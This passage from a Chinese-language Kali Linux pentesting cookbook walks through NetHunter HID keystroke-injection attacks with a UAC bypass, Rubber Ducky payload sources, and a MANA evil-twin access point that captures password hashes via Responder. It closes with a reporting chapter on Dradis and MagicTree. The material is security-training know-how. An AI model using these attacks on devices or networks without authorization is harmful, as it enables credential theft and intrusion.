1.  让我们尝试 Windows CMD；在编辑源框中，我们可以输入要执行的命令。我们甚至可以从选项中选择 UAC Bypass，以便在不同版本的 Windows 上以管理员身份运行命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/92c6b823-d331-4bab-aa8d-ec2f87cdd54e.png)

1.  我们从 UAC Bypass 菜单中选择 Windows 10，然后输入一个简单的命令：

```
        echo "hello world"  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b84b1f49-97fb-476e-8f20-f1088ace13f7.png)

1.  然后，我们将手机连接到 Windows 10 设备，并从菜单中选择执行攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/875d98b8-8196-4f7a-adbe-e8806fbd39a4.png)

1.  我们将看到命令被执行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1bfe0cbd-8d94-4460-943e-20e0966813d5.png)

有关更多信息，请访问[`github.com/offensive-security/kali-NetHunter/wiki/NetHunter-HID-Attacks`](https://github.com/offensive-security/kali-nethunter/wiki/NetHunter-HID-Attacks)。

# 我可以给手机充电吗？

在这个教程中，我们将看一种不同类型的 HID 攻击，称为 DuckHunter HID。这使我们能够将臭名昭著的 USB Rubber Ducky 脚本转换为 NetHunter HID 攻击。

# 如何操作...

要执行 DuckHunter HID 攻击，请按照以下步骤进行操作：

1.  我们可以通过打开 NetHunter 应用程序来执行它们。

1.  在菜单中，我们选择 DuckHunter HID 攻击。

1.  转换选项卡是我们可以输入或加载我们的脚本以执行的地方：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d15cac69-980b-450b-9400-8e5209b004eb.png)

1.  让我们从使用一个简单的“Hello world！”脚本开始。

1.  我们在任何设备上打开文本编辑器，然后连接我们的设备并点击播放按钮。

1.  我们将看到这是自动在编辑器中输入的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/11ac900d-44c1-4e80-9c35-5b9b58ac556a.png)

1.  互联网上有多个脚本可用于使用 NetHunter 执行多个攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b81408b9-dae7-4cdf-914f-c4563ebbddc4.png)

1.  这些可以下载并加载到 NetHunter 中，然后稍后用于利用受害者的 PC；列表可以在[`github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads`](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads)找到。

更多信息可以在[`github.com/hak5darren/USB-Rubber-Ducky/wiki`](https://github.com/hak5darren/USB-Rubber-Ducky/wiki)找到。

# 设置一个邪恶的接入点

MANA 工具包是由 SensePost 创建的邪恶接入点实施工具包，可用于执行 Wi-Fi、AP 和 MITM 攻击。一旦受害者连接到我们的接入点，我们将能够执行多个操作，您将在本教程中了解到。

# 如何操作...

要设置一个邪恶的接入点，请按照以下步骤进行操作：

1.  这很容易使用。在 NetHunter 菜单中，我们选择 Mana Wireless Toolkit：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/fdbda1f9-6f53-4510-94d1-ad10caba6118.png)

1.  它在常规设置选项卡中打开。在这里，我们可以选择接口和其他选项，比如捕获 cookies。这可以用来通过使用 NetHunter 支持的外部无线网卡执行恶意双胞胎攻击来执行无线攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6ed7c12e-6e1c-4b6e-801a-caee4cff87a3.png)

1.  在前几章中，您了解了 responder。我们可以通过这个工具包使用 responder 来捕获网络哈希。

1.  首先，我们连接到我们想要执行攻击的网络。

1.  接下来，我们切换到 Responder Settings 选项卡，并勾选我们希望执行的攻击。我们选择 wlan0 作为我们的接口。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d27a833a-883d-4c18-9d16-82a0fbd1c704.png)

1.  要更改要监听的接口，我们切换到常规设置选项卡，并从下拉列表中选择接口列表中的接口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/128f70c5-96dc-4844-8cea-1be090cf2ef0.png)

1.  现在我们点击右侧选项菜单中的 Start mitm attack。

1.  我们将看到一个终端窗口打开，我们的攻击将被执行。我们将看到攻击捕获的主机信息以及密码哈希：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e2354787-8e39-46b9-b99b-09889079f494.png)

1.  同样，还有其他攻击，比如 Nmap 扫描、生成 Metasploit 有效载荷等。

有关更多信息，请访问[`github.com/offensive-security/kali-NetHunter/wiki`](https://github.com/offensive-security/kali-NetHunter/wiki)。


# 第十二章：撰写报告

在本章中，我们将介绍以下内容：

+   使用 Dradis 生成报告

+   使用 MagicTree

# 介绍

在本章中，我们将介绍渗透测试项目中最重要的步骤之一，即报告。一个好的报告必须包含漏洞的每一个细节。我们的目标是尽可能详细，这可能有助于部门中的合适人员理解所有细节，并通过完美的补丁解决问题。

有不同的方法来创建渗透测试报告。在本章中，您将学习一些工具，我们可以使用这些工具来创建一个详细的报告。

让我们看一下报告中应该始终包含的一些关键点：

+   漏洞的详细信息

+   CVSS 评分

+   漏洞对组织的影响

+   修补漏洞的建议

**通用漏洞评分系统**（**CVSS**）是一种标准化的评估 IT 漏洞并确定响应紧急性的方法。

您可以在[`www.first.org/cvss`](https://www.first.org/cvss)了解更多关于 CVSS 的信息。

# 使用 Dradis 生成报告

Dradis 是一个开源的基于浏览器的应用程序，可以用于合并不同工具的输出并生成报告。它非常容易使用，并且预装在 Kali 中。但是，运行它可能会显示错误。因此，我们将重新安装它，然后学习如何使用它。

# 如何做到这一点... 

以下是使用 Dradis 的步骤：

1.  首先，我们需要通过运行以下命令来安装依赖项：

```
 apt-get install libsqlite3-dev
 apt-get install libmariadbclient-dev-compat 
 apt-get install mariadb-client-10.1
 apt-get install mariadb-server-10.1
 apt-get install redis-server
```

1.  然后，我们使用以下命令：

```
 git clone https://github.com/dradis/dradis-ce.git  
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2bde2850-758e-4af0-813f-88d02f812ae3.png)

1.  然后，我们更改我们的目录：

```
        cd dradis-ce/
```

1.  现在我们运行以下命令：

```
 bundle install --path PATH/TO/DRADIS/FOLDER  
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0273e317-4f29-4381-9361-8e549f28ecd6.png)

1.  我们运行这个命令：

```
        ./bin/setup   
```

1.  要启动服务器，我们运行这个：

```
        bundle exec rails server  
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/33243ba7-2252-4e31-914b-63336457a486.png)

1.  我们现在可以在`https://localhost:3000`上访问 Dradis。

1.  在这里，我们可以设置我们的密码来访问框架，并用密码登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9fd71832-36cd-4327-b42d-75a36eff1bfd.png)

1.  我们将被重定向到仪表板：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/543f982c-0025-4e3e-b025-aea5a80919ae.png)

1.  Dradis 的免费版本支持各种工具的插件，如 Nmap、Acunetix 和 Nikto。

1.  Dradis 允许我们创建方法论。它可以被视为一个检查表，在为组织执行渗透测试活动时可以使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/75a33756-f055-48ca-8534-218808dcddaa.png)

1.  要创建一个检查表，我们去到方法论，然后点击添加新的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/eee1c455-b33b-4992-bfd1-10d0191ec2e3.png)

1.  然后我们分配一个名称并点击添加到项目：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/cd7d1baa-f159-4f30-906e-d2b15511640d.png)

1.  现在我们应该看到为我们创建的一个示例列表。我们可以通过点击右侧的编辑按钮来编辑它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/05d6fe1d-bd33-425f-9230-c161151e2bdd.png)

1.  在这里，我们看到列表是以 XML 格式创建的。我们可以通过点击更新方法论来编辑和保存它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/36fb2a19-2958-4d46-b893-f21537f34208.png)

1.  现在让我们看看如何更好地组织我们的扫描报告。我们转到左侧菜单上的节点选项，然后点击+号；一个弹出框将打开，我们可以添加一个网络范围，然后点击添加：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/264b8c46-b5b9-4a3e-a7c7-5aa7834c06ef.png)

1.  要添加一个新的子节点，我们从左侧窗格中选择节点，然后选择添加子节点选项。这可以用来根据主机的 IP 地址组织基于网络的活动。

1.  接下来，我们可以添加注释和漏洞的 PoC 截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/73c0eb4d-6d57-41ea-a10a-464c1bdb06db.png)

1.  我们甚至可以将各种工具的结果导入到 Dradis 中。这可以通过从顶部菜单选择从工具上传输出来完成：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f8b61bd5-33fa-49e1-84f1-22240d23588d.png)

1.  在这里，我们上传我们的输出文件。Dradis 有内置插件，可以解析不同工具的报告：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/63ee1013-f5db-40e0-af90-4d1decb5fb0e.png)

1.  导入完成后，我们将在左侧窗格下的“插件输出”标题下看到结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/016478e1-ad38-49a0-b468-a9fff5af8020.png)

1.  我们可以看到我们刚刚导入的扫描结果的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/20455b67-a224-4193-9cf6-79a5ac5d8105.png)

1.  同样，不同的扫描可以被导入并组合在一起，并可以使用 Dradis 框架导出为一个单一的报告：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/578aa9db-6bfa-4608-83f9-03b91d921d13.png)

有关 Dradis 的更多信息，请访问官方网站：[`dradisframework.com/`](https://dradisframework.com/)。

# 使用 MagicTree

MagicTree 是一种类似于 Dradis 的数据管理和报告工具。它预先安装在 Linux 上，并使用树和节点结构组织所有内容。它还允许我们执行命令并将结果导出为报告。在这个教程中，我们将看一些使用 MagicTree 来简化我们的渗透测试任务的方法。

# 如何做...

以下是使用 MagicTree 的方法：

1.  我们可以从应用程序菜单中运行它。

1.  我们接受条款，应用程序将打开：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d8d5a10c-d92d-48a6-84e6-c78d1036f669.png)

1.  接下来，我们通过转到节点 | 自动创建来创建一个新节点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6b6e3df0-387e-4076-a332-d2eeb300030b.png)

1.  在打开的框中，我们输入要添加的主机的 IP 地址。

1.  一旦节点被添加，它将出现在左侧窗格中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b715dac3-c125-4ecd-b1c0-5bcba3cbf016.png)

1.  要对主机运行扫描，我们转到表视图；在底部，我们将看到一个名为命令的输入框：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/18bec02e-f01d-406b-b1a3-ce323cd5ab10.png)

1.  我们将对刚刚添加的主机运行 Nmap 扫描。

1.  MagicTree 允许您查询数据并将其发送到 shell。我们点击 Q*按钮，它将自动为我们选择主机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b7cd78ed-5159-4b94-a6ce-8b8f82db14be.png)

1.  现在我们只需要输入以下命令：

```
        nmap -v -Pn -A -oX $results.xml $host  
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/98ef321a-875a-441d-b9a5-1badc992b223.png)

1.  由于主机已经被识别，我们不需要在这里提及它们。然后，我们点击运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e2318ae2-b4ed-4ea4-94f4-6fb8f3dd3823.png)

1.  我们将看到一个窗口，显示正在执行的扫描以及输出。扫描完成后，我们可以点击导入，它将被导入到工具中。

1.  同样，我们可以运行任何其他工具并将其报告导入到 MagicTree。我们可以通过导航到报告 | 生成报告...来生成报告：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d62a6dce-4fa3-426b-b211-b4876559c4cd.png)

1.  在下一个窗口中，我们可以浏览我们想要使用的模板列表来保存报告：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/93f5323a-9f25-460d-9133-9449540a01df.png)

1.  然后，我们点击生成报告按钮，我们将看到报告正在生成：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/76fc3be9-3641-4ded-b6a8-8a5c0868bb6b.png)

# 还有更多...

还有其他工具可以用于报告生成，例如以下内容：

+   **Serpico**: [`github.com/SerpicoProject/Serpico`](https://github.com/SerpicoProject/Serpico)

+   **Vulnreport**: [`vulnreport.io/`](http://vulnreport.io/)
